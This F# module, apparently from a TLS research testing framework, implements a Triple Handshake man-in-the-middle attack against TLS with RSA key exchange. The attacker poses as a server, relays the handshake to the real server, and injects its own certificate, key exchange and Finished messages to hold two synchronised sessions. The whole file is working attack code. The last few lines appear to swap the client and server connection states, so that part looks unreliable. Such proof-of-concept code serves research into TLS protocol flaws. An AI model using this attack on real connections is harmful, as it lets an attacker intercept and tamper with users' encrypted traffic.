﻿#light "off"

module Attack_TripleHandshake

open Bytes
open Error
open TLSInfo
open TLSConstants

open FlexTypes
open FlexConstants
open FlexHandshake
open FlexConnection
open FlexClientHello
open FlexServerHello
open FlexCertificate
open FlexServerHelloDone
open FlexClientKeyExchange
open FlexCCS
open FlexFinished
open FlexState
open FlexSecrets




type Attack_TripleHandshake =
    class

    static member runMITM (attacker_server_name:string, attacker_cn:string, attacker_port:int, server_name:string, ?port:int) : unit =
        let port = defaultArg port FlexConstants.defaultTCPPort in
        match Cert.for_signing FlexConstants.sigAlgs_ALL attacker_cn FlexConstants.sigAlgs_RSA with
        | None -> failwith (perror __SOURCE_FILE__ __LINE__ (sprintf "Private key not found for the given CN: %s" attacker_cn))
        | Some(attacker_chain,_,_) -> Attack_TripleHandshake.runMITM(attacker_server_name,attacker_chain,attacker_port,server_name,port)

    static member runMITM (attacker_server_name:string, attacker_chain:Cert.chain, attacker_port:int, server_name:string, ?port:int) : unit =
        let port = defaultArg port FlexConstants.defaultTCPPort in
        let attacker_cn =
            match Cert.get_hint attacker_chain with
            | None -> failwith (perror __SOURCE_FILE__ __LINE__ "Could not parse given certficate")
            | Some(cn) -> cn
        in

        // Start being a server
        printf "Please connect to me, and I will attack you.\n";
        let sst,_ = FlexConnection.serverOpenTcpConnection(attacker_server_name,cn=attacker_cn,port=attacker_port) in
        let sst,nsc,sch = FlexClientHello.receive(sst) in

        // Start being a client
        let cst,_   = FlexConnection.clientOpenTcpConnection(server_name,cn=server_name,port=port) in
        
        //BB TODO : Modify the received client hello to only authorize RSA ciphersuites
        let cst     = FlexHandshake.send(cst,sch.payload) in
        
        // Forward server hello but check that the choosen ciphersuite is RSA
        let cst,nsc,ssh   = FlexServerHello.receive(cst,sch,nsc) in
        if not (TLSConstants.isRSACipherSuite (TLSConstants.cipherSuite_of_name ssh.suite)) then
            failwith "Triple Handshake demo only implemented for RSA key exchange"
        else
        let sst = FlexHandshake.send(sst,ssh.payload) in

        // Discard the real certificate of the server and inject ours instead
        let cst,cnsc,ccert = FlexCertificate.receive(cst,Client,nsc) in
        let sst,snsc,scert = FlexCertificate.send(sst,Server,attacker_chain,nsc) in

        // Forward the server hello done
        let cst,sst,shdpayload  = FlexHandshake.forward(cst,sst) in

        // Discard the real the client key exchange and inject ours instead
        let sst,snsc,sfcke  = FlexClientKeyExchange.receiveRSA(sst,snsc,sch) in
        let cst,cnsc,cfcke  = FlexClientKeyExchange.sendRSA(cst,cnsc,sch) in

        // Forward the client CCS
        let sst,cst,_ = FlexCCS.forward(sst,cst) in

        // Install the keys for the Real Client -> Real Server direction
        let sst       = FlexState.installReadKeys sst snsc in
        let cst       = FlexState.installWriteKeys cst cnsc in

        // Compute the log of the handshake
        let slog      = sch.payload @| ssh.payload @| scert.payload @| shdpayload @| sfcke.payload in
        let clog      = sch.payload @| ssh.payload @| ccert.payload @| shdpayload @| cfcke.payload in

        // Discard the real the finished message and inject ours instead
        let sst,sff   = FlexFinished.receive(sst,logRoleNSC=(slog,Client,snsc)) in
        let cst,cff   = FlexFinished.send(cst,logRoleNSC=(clog,Client,cnsc)) in

        // Forward the server CCS
        let cst,sst,_ = FlexCCS.forward(cst,sst) in

        // Install the keys for the Real Server -> Real Client direction
        let cst       = FlexState.installReadKeys cst cnsc in
        let sst       = FlexState.installWriteKeys sst snsc in

        // Compute the log of the handshake
        let slog      = slog @| sff.payload in
        let clog      = clog @| cff.payload in

        // Discard the real the finished message and inject ours instead
        let cst,cff       = FlexFinished.receive(sst,logRoleNSC=(clog,Server,cnsc)) in
        let sst,sff       = FlexFinished.send(cst,logRoleNSC=(slog,Server,snsc)) in
        ()

    end
